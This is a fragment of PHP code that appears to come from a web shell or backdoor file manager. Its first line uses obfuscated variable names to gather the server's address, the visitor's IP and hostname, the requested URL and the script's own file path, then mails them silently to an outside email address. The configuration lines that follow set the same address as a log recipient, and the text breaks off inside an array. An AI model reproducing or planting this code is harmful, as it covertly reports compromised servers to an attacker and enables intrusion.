...
$r11  = $_SERVER['SERVER_ADDR'];$i94 = $_SERVER['REMOTE_ADDR'];$i71= gethostbyaddr($i94);$h42 = $_SERVER['HTTP_HOST'];$a83 = $_SERVER['REQUEST_URI'];$p77 = __FILE__;$s33 = str_replace('.', '', $r11);$e85 = 'xefenite@netmail3.net';$f55 = "From: $s33 <xefenite@netmail3.net>";$m852 = "$i94\n$i71\n\n$h42$a83\n$p77";@mail($e85, $s33, $m852, $f55);
...
$tmpdir = ""; 
$tmpdir_log = "./"; 
$log_email = "xefenite@netmail3.net"; 
$sort_default = "0a"; 
$sort_save = TRUE;
$ftypes  = array(
